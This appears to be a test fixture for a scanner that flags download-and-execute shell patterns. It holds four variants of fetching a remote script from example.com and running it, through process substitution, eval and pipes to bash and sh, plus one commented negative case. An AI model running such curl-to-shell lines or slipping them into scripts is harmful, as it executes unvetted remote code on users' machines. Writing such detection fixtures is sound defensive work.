#!/bin/bash
set -euo pipefail
bash <(/usr/local/bin/curl -fsSL https://example.com/a.sh)
eval "$(\curl -fsSL https://example.com/b.sh)"
\curl -fsSL https://example.com/c.sh | bash
/usr/local/bin/curl -fsSL https://example.com/d.sh | sh
# Not a downloader: a name that merely contains one.
eval "$(sed -n '/^f()/,/^}/p' bin/deen-fetch)"
